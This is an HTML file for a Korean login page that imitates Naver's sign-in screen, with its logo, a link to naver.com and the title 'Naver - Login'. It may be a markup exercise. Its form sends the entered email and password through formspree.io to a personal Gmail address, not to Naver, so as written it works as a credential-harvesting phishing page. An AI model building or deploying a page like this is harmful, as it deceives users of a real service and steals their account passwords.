<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>네이버 - 로그인</title>
    <link rel="stylesheet" href="./css/style.css" />
</head>
<body>
    <h1 class="logo"></h1><a href="https://www.naver.com/"></a><img src="./images/logo.png" srcset="./images/logo.svg"
     alt="Naver">
    <form action="http://formspree.io/seulbinim@gmail.com" class="login-form" method="POST">
    <fieldset>
        <legend>로그인 폼</legend>
        <div class="user-email">
            <label for="userEmail">아이디</label>
            <input name="userEmail" type="email" id="userEmail" placeholder="아이디(이메일)" required="required" >
        </div>
        <div class="user-password">
            <label for="userPassword">비밀번호</label>
            <input name="userPassword" type="password" id="userPassword" placeholder="비밀번호" required="required" >
        </div>
        <div class="ip-state-wrapper">
            <div class="login-state"> <input name="state" type="checkbox" id="loginState">
            <label for="loginState"><span class="icon-check"></span>
            로그인 상태유지
        </label>
    </div>
    <div class="loginIP">
        <input name="ip" type="checkbox" id="loginIP">
        <label for="loginIP">IP 보안</label>
    </div>
     </div>
     <button type="submit" class="btn-login">로그인</button>
    </fieldset>
    </form>

</body>
</html>
